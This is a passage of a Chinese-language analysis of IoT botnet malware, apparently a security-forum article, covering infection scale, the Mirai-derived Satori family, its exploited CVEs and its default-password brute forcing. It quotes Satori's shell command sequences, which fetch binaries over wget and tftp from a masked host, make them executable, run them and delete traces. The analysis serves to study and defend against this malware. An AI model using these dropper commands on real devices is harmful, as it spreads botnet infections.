normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">在攻击命令方面，虽然我们在Lua执行环境的源文件中看到了对DDoS攻击的支持，但到目前为止还没有看到实际的DDoS攻击。看到的唯一指示是下载样本。这意味着攻击者仍然关注于传播僵尸网络。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">通过使用一些技巧，可以得出一些相当准确的测量感染的规模，这里是一个数字样本。</span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">一个等待感染的c2队列中容易受到攻击的设备数量：超过2m;</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">过去7天内一个c2控制的设备超过20k;</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">十月十九日每日活跃设备约一万;</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">由一个c2控制的同时在线设备的数量：大约4k</span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><h1 style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong>Satori家族</strong></span></h1><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><hr style="white-space: normal;"><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">2017年4月以来，Satori恶意软件发起的攻击就已经被发现,由于&nbsp;&nbsp;CVE-2014-8361&nbsp;(Realtek SDK中miniigd SOAP命令执行)和CVE 2017-17215&nbsp;(华为路由器命令执行)这样两个漏洞才使得Satori开始受关注，Satori家族有三个主要的变异样本</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFf4lib0oR6RWnucxuibjOZKh96ICckxmGqB4hwfiaEekKbtXuczoX7ePlA/?wx_fmt=png" style="cursor: pointer; width: 754px !important; height: 146.86px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">第一种变异只扫描Internet，并通过尝试不同的密码来Telnet登录，成功登录后，首先启用shell访问，然后只执行命令“/ bin / busybox satori”或“/ bin / busybox SATORI”</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">enable</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">system</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">shell</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">sh</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;satori&nbsp;(or&nbsp;/bin/busybox&nbsp;SATORI)</span></p></blockquote><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">第二种变异增加了一个封隔器，可能会逃避静态检测，同时，攻击者在密码字典中添加“aquario”密码并且在第一次尝试时总是使用“aquario”登录。“aquario”是南美洲国家流行无线路由器的默认密码。这表明攻击者有意在南美洲开始攻击这些设备</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">enable</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">system</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">shell</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">sh</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">ping&nbsp;;&nbsp;sh</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;SATORI&nbsp;(or&nbsp;/bin/busybox&nbsp;OKIRU)</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">&gt;DIR/.file&nbsp;&amp;&amp;&nbsp;cd</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">&gt;DIR/.file&nbsp;&amp;&amp;&nbsp;cd&nbsp;DIR&nbsp;&amp;&amp;&nbsp;/bin/busybox&nbsp;rm&nbsp;–rf&nbsp;.file</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">(DIR&nbsp;=&nbsp;[‘/dev/netslink/’,&nbsp;‘/var/tmp/’,&nbsp;‘/tmp/’,&nbsp;‘/var/’,&nbsp;‘/home’,&nbsp;‘/’,&nbsp;‘./’,&nbsp;‘/dev/’,&nbsp;‘/mnt/’,&nbsp;‘/boot/’,&nbsp;‘/dev/shm/’,&nbsp;‘/usr/’])</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;rm&nbsp;-rf&nbsp;.okiru.dropper&nbsp;.okiru.binary&nbsp;.file</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;wget;&nbsp;/bin/busybox&nbsp;tftp;&nbsp;/bin/busybox&nbsp;NBVZA</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;wget;&nbsp;/bin/busybox&nbsp;tftp;&nbsp;/bin/busybox&nbsp;echo</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;cat&nbsp;/bin/busybox&nbsp;||&nbsp;while&nbsp;read&nbsp;i;&nbsp;do&nbsp;/bin/busybox&nbsp;echo&nbsp;$i;&nbsp;done&nbsp;&lt;&nbsp;/bin/busybox&nbsp;||&nbsp;/bin/busybox&nbsp;dd&nbsp;if=/bin/busybox&nbsp;bs=22&nbsp;count=1</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;cp&nbsp;/bin/busybox&nbsp;xhgyeshowm;&nbsp;/bin/busybox&nbsp;cp&nbsp;/bin/busybox&nbsp;gmlocerfno;&nbsp;&gt;xhgyeshowm;&nbsp;&gt;gmlocerfno;&nbsp;/bin/busybox&nbsp;chmod&nbsp;777&nbsp;xhgyeshowm&nbsp;gmlocerfno</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;wget&nbsp;http://xxx.xxx.xxx.xxx:xxx/bins/satori.arm&nbsp;-O&nbsp;–&nbsp;&gt;&nbsp;gmlocerfno;&nbsp;/bin/busybox&nbsp;chmod&nbsp;777&nbsp;gmlocerfno;&nbsp;./gmlocerfno&nbsp;arm;&nbsp;&gt;gmlocerfno</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">/bin/busybox&nbsp;tftp&nbsp;–r&nbsp;satori.arm&nbsp;–l&nbsp;gmlocerfno&nbsp;–g&nbsp;xxx.xxx.xxx.xxx;&nbsp;/bin/busybox&nbsp;chmod&nbsp;777&nbsp;gmlocerfno;&nbsp;./gmlocerfno&nbsp;arm;&nbsp;&gt;gmlocerfno</span></p></blockquote><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">第三种变异使用两个远程代码执行漏洞的攻击，包括一个零日漏洞（CVE-2017-17215），还有一些与前两种变异共享相同的嵌入式命令</span></p><blockquote style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">busybox&nbsp;wget&nbsp;-g&nbsp;xxx.xxx.xxx.xxx&nbsp;-l&nbsp;/tmp/rsh&nbsp;-r&nbsp;/okiru.mips&nbsp;;chmod&nbsp;+x&nbsp;/tmp/rsh&nbsp;;/tmp/rsh</span></p><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="color: rgb(79, 79, 79);font-size: 12px;">cd&nbsp;/var/;&nbsp;wget&nbsp;http://xxx.xxx.xxx.xxx/rt.mips&nbsp;-O&nbsp;-&gt;&nbsp;c</span></p></blockquote><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFMibmAyj0MH7CP6GtKCKMYfwp3Kqcib2bZiclQqWLVNDNZibbqpu8xXAibCQ/?wx_fmt=png" style="cursor: pointer; width: 754px !important; height: 463.476px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(79, 79, 79);font-size: 15px;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">上图“aquario”被添加到密码字典中</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFHb77hiavWZTdJMYkkjrb5S8Uhiax2GtNMyZqgg35hOE97xAX9CCIt9gw/?wx_fmt=png" style="cursor: pointer; width: 754px !important; height: 80.4267px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">上图为版本2.0和版本3.0中的命令</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong>来自Mirai的衍生物</strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">由于Mirai的源代码是在Github开源的，攻击者可以很容易地重用Mirai的代码来实现网络扫描器和密码暴力登录模块，用于发起telnet暴力密码强制攻击或其他攻击。Satori家族重复使用Mirai代码，包括网络扫描器，telnet密码尝试和看门狗禁用（图4）。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFafnYVjm5IvIK31qDgM5V5rticiaC3icFdkWacmGBAkvAbefnZQ7BF5lZA/?wx_fmt=png" style="cursor: pointer; width: 542px !important; height: 254.862px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">禁用watch-dog（安全狗）</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Satori还通过在“/ proc / PID / maps”和“/ proc / PID / exe”下图中搜索八个字符串来遍历“/ proc”来杀死其他进程。在第二个变体中，我们注意到在不同的设备中，查杀过程行为是不同的。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">Satori通过以相同的方式在“/ proc”中搜索关键字“/ var / Challenge”，“hi3511”，“/ mnt / mtd / app / gui”，“gmDVR”来检查受感染设备是否是特定设备类型。但是，在相应的四个物联网设备中，Satori不会终止进程。</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">从这四个字符串中，我们怀疑Satori的作者已经开始逆向IoT设备的固件，并将发现的0day添加到攻击设备列表中</span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;text-align: center;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogFUyFoOUuyRqqFs9vib25SMddmAicmT4ZVtB67APQ3xIHyrbjDjpXmwkCQ/?wx_fmt=png" style="cursor: pointer; width: 597px !important; height: 1350px !important;"></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(0, 81, 171);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(0, 81, 171);"><br></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);">结论</span></strong></span></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><hr style="white-space: normal;"><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">从上面的Iot僵尸网络家族看出，物联网恶意软件一直存在，从简单的密码暴力攻击发展到利用已知漏洞攻击到利用0day攻击。Mirai的开源代码为物联网恶意软件作者开发新的变异样本提供了一个很好的起点。物联网恶意软件作者继续依赖使用更多已知的漏洞或0day发现易受攻击物联网设备的零日漏洞，很明显这将是个趋势，同样这种趋势也将推动着物联网安全的发展</span></p><p style="white-space: normal;letter-spacing: 2px;"><br></p><p style="margin-right: 8px;margin-left: 8px;white-space: normal;letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">参考:</span></p><ul class="list-paddingleft-2" style=""><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">https://researchcenter.paloaltonetworks.com/2018/01/unit42-iot-malware-evolves-harvest-bots-exploiting-zero-day-home-router-vulnerability/</span><br></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/</span><br></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/</span><br></p></li><li><p style="margin-right: 8px;margin-left: 8px;letter-spacing: 0px;"><span style="font-size: 15px;color: rgb(79, 79, 79);">http://blog.netlab.360.com/early-warning-a-new-mirai-variant-is-spreading-quickly-on-port-23-and-2323-2/</span></p></li></ul><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><section label="Copyright © 2014 playhudong All Rights Reserved." style="max-width: 100%;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;box-sizing: border-box !important;word-wrap: break-word !important;"><img src="http://mmbiz.qpic.cn/mmbiz_png/1UG7KPNHN8G9B6YFlthnv1h3cWDDXGAmK9wQfy6pod114tTuOSIFVeVd0vd1PEwicksgBGmxL0iaC0icX7B9EQzNg/?wx_fmt=png" style="margin-right: auto; margin-left: auto; display: block; box-sizing: border-box !important; word-wrap: break-word !important; overflow-wrap: break-word !important; visibility: visible !important; width: 160px !important; height: 8.44575px !important;"></section><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;box-sizing: border-box !important;word-wrap: break-word !important;"><br></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;">本文由看雪论坛 阿東 原创<br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;">转载请注明来自看雪社区</span></p><p><br></p><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"><br></span></p><p style="white-space: normal;"><span style="font-size: 15px;color: rgb(79, 79, 79);"></span></p><p style="margin: 15px 8px;font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);box-sizing: border-box !important;word-wrap: break-word !important;"><strong><span style="max-width: 100%;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;">热门阅读</span></strong></p><ul class="list-paddingleft-2" style=""><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287391&amp;idx=2&amp;sn=36b62672417c3c56a1d8fb23c378eb83&amp;chksm=b1814d9586f6c483d25fb5a6c5e1654751476feedb40617587cdd878fa7bfafd2784eea05980&amp;scene=21#wechat_redirect" target="_blank" style="color: rgb(87, 107, 149);outline: 0px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">方法 | 在Windows系统上修复Meltdown和Specture CPU漏洞</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287415&amp;idx=1&amp;sn=dba14b0b922e4577028ccab4bc6d1451&amp;chksm=b1814dbd86f6c4ab6df058462e0147f59ab8757ab3e65f5fdf6b3058d8d65d146cf4c04a32a6&amp;scene=21#wechat_redirect" target="_blank" style="color: rgb(87, 107, 149);outline: 0px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">通俗理解这次的CPU漏洞，附带修改过带注释源码一份</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287434&amp;idx=1&amp;sn=a526b80315d80f63afe73923818dcd70&amp;chksm=b1814dc086f6c4d65f85d18c15738484e113d23b7af5f8c6c6734037bae31fb26e68a286ea8b&amp;scene=21#wechat_redirect" target="_blank" style="color: rgb(87, 107, 149);outline: 0px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">简单看一下 &nbsp;微软新出的内核页表隔离补丁</a></span></p></li><li><p style="margin-top: 10px;margin-bottom: 10px;max-width: 100%;min-height: 1em;line-height: 2em;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><span style="max-width: 100%;color: rgb(63, 63, 63);font-size: 14px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458287468&amp;idx=1&amp;sn=ff2b2d716b79e1003b90e9540b64977e&amp;chksm=b1814de686f6c4f0d7069b2832e8af68a0a1def12ed0afcee3afc90211ea56e82bef7be3e392&amp;scene=21#wechat_redirect" target="_blank" style="color: rgb(87, 107, 149);outline: 0px;max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;">c++实现的一种代码膨胀变形壳</a></span></p></li></ul><p style="margin-right: 8px;margin-left: 8px;font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"></span></p><p style="margin-right: 8px;margin-left: 8px;font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;">点击阅读原文/read，</span></p><p style="margin-right: 8px;margin-left: 8px;font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;">更多干货等着你~</span></p><p style="margin-right: 8px;margin-left: 8px;font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><span style="max-width: 100%;font-size: 15px;color: rgb(63, 63, 63);letter-spacing: 1px;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;overflow-wrap: break-word !important;"></span></p><p style="font-size: 16px;white-space: normal;max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);box-sizing: border-box !important;word-wrap: break-word !important;"><img src="https://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GMz3xtuyiaziaAmyuSrMMogF7k9ial3PRnycAlV0MDpvGhZUiblIMHerzDl3m9zvOhQbeceHRibIK2xsg/?wx_fmt=jpeg" style="box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: 770px !important; height: 193.302px !important;"></p><p><br></p><hr/><a href="http://mp.weixin.qq.com/s?timestamp=1515984875&src=3&ver=1&signature=yyLj*6br2FUtW3BtBE3siPPs-NRfvlwjuvH7xFTtLmsOPyUEuRfepE4lmADgDB-KqTGJpoTQDDroKcwkYhW3KcGinG8*4gyQqgWcetr5CFXvlyIA72IEwVNwVn1GU1mSJ6FijRbWmAjkpEhuP45r2m7buECjdA7DYXgrgPPzn7k=">微信地址</a> | <a href="https://bbs.pediy.com/thread-224008.htm">阅读原文</a>
{% endraw  %}

